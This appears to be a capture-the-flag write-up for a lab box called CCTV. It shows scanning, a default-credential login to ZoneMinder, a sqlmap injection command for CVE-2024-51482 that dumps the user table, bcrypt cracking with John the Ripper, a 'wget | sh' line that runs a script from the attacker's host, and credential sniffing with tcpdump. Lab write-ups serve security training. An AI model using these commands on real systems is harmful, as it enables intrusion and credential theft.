# Box Name
CCTV 

# Community Rating
Easy

# Method of Solve
```
sudo nmap -p- -sC -sV -O 10.129.100.126 --min-rate 5000
sudo: unable to resolve host kali: Name or service not known
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-02 20:45 EDT
Warning: 10.129.100.126 giving up on port because retransmission cap hit (10).
Nmap scan report for cctv.htb (10.129.100.126)
Host is up (0.54s latency).
Not shown: 48640 closed tcp ports (reset), 16893 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.25 seconds
```
from there I used 
```
echo {BOXIP} cctv.htb | sudo tee /etc/hosts

going onto the website we see 
<img width="945" height="351" alt="image" src="https://github.com/user-attachments/assets/5402d60d-6d9e-4e70-a091-6b5821166935" />

we also run a fuff scan 
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cctv.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 462ms]
zm                      [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 467ms]
                        [Status: 200, Size: 6177, Words: 1643, Lines: 225, Duration: 354ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 501ms]
:: Progress: [220560/220560] :: Job [1/1] :: 15 req/sec :: Duration: [1:07:06] :: Errors: 890 ::

```

going to zm we see a log in. to rule out the basic I tried admin:admin 

turns out it worked. 

from here we look for a vulnerability and find CVE-2024-51482

to exploit the CVE we take our current cookie we are using and run the following command
```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \                                                                                                                                          
-D zm -T Users -C Username,Password --dump --batch \                                                                                                                                                                                       
--dbms=MySQL --technique=T \                                                                                                                                                                                                               
--cookie="ZMSESSID={active-Cookie}" \                                                                                                                                                                                           
--time-sec=2 
```
It took about 1.5hrs. Produced the following:
```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.  (mark)
$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m (admin)

```

then using John the ripper we decrypt
```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt cctv.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
opensesame 
```
mark@cctv:/tmp$ wget {HOSTIP}/linPEAS.sh | sh

box is containered so we try
```
tcpdump -i any -nn -A tcp port 5000
```
we found
```
H...?.!.USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
05:20:32.390732 veth06bd699 Out IP 172.25.0.11.60322 > 172.25.0.10.5000: Flags [P.], seq 1:55, ack 1, win 502, options [nop,nop,TS val 1208476549 ecr 1071653146], length 54
E..ji>@.@.y........
```
pivoting to sa_mark:X1l9fx1ZjS7RZb
